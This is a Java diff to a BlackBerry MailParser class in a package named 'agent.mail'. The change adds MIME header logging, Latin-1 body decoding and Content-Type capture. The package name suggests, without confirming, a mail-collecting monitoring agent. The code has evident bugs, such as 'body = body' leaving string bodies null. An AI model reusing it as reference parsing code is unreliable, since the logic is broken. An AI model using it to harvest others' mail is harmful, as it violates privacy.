@@ -1,6 +1,10 @@
 //#preprocess
 package blackberry.agent.mail;
 
+import java.io.UnsupportedEncodingException;
+import java.util.Enumeration;
+
+import net.rim.blackberry.api.mail.Header;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MimeBodyPart;
 import net.rim.blackberry.api.mail.Multipart;
@@ -73,21 +77,75 @@ public class MailParser {
     }
 
     /**
-     * text/html
+     * MimeBodyPart text/html
      * 
      * @param mbp
      */
     private void readEmailBody(final MimeBodyPart mbp) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("readEmailBody: MimeBodyPart");
+        //#endif
         //Extract the content of the message.
         final Object obj = mbp.getContent();
         final String mimeType = mbp.getContentType();
+
+        //String encoding = "UTF-8"; // "ISO-8859-1", "UTF-16LE" ... 
+        try {
+            //TODO: aggiungere automaticamente headers.
+            Enumeration enumeration = mbp.getAllHeaders();
+            while (enumeration.hasMoreElements()) {
+
+                Object headerObject = enumeration.nextElement();
+
+                if (headerObject instanceof String) {
+                    String header = (String) headerObject;
+
+                    //#ifdef DEBUG_TRACE
+                    debug.trace("readEmailBody HEADER: " + header
+                            + " = " + header);
+                    //#endif
+                    
+                    
+                    
+                } else {
+                    //#ifdef DEBUG_ERROR
+
+                    debug.error("readEmailBody HEADER: "
+                            + headerObject.getClass().getName() + " tostring: "
+                            + headerObject.toString());
+                    //#endif
+                }
+            }
+        } catch (Exception ex) {
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
+        }
+
         String body = null;
+
+        // generazione del body
         if (obj instanceof String) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("readEmailBody: from String");
+            //#endif
             body = body;
         } else if (obj instanceof byte[]) {
-            body = new String((byte[]) obj);
+            //#ifdef DEBUG_TRACE
+            debug.trace("readEmailBody: from byte[]");
+            //#endif
+            //Usare la codifica latin1 per garantire la lettura 1 byte alla volta
+            try {
+                body = new String((byte[]) obj, "ISO-8859-1");
+            } catch (UnsupportedEncodingException e) {
+                //#ifdef DEBUG_ERROR
+                debug.error(e);
+                //#endif
+            }
         }
+
         if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
+            mail.plainTextMessageContentType = "Content-Type: "+mimeType+"\r\n\r\n";
             mail.plainTextMessage = body;
             //Determine if all of the text body part is present.
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
@@ -105,6 +163,7 @@ public class MailParser {
                 }
             }
         } else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
+            mail.htmlMessageContentType = "Content-Type: "+mimeType+"\r\n\r\n";
             mail.htmlMessage = body;
             //Determine if all of the HTML body part is present.
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
@@ -130,6 +189,13 @@ public class MailParser {
      * @param tbp
      */
     private void readEmailBody(final TextBodyPart tbp) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("readEmailBody: TextBodyPart");
+        //#endif
+        
+        String mimeType = tbp.getContentType();
+        mail.plainTextMessageContentType = "Content-Type: "+mimeType+"\r\n\r\n";
+        
         if (mail.plainTextMessage == null) {
             mail.plainTextMessage = (String) tbp.getContent();
         } else {
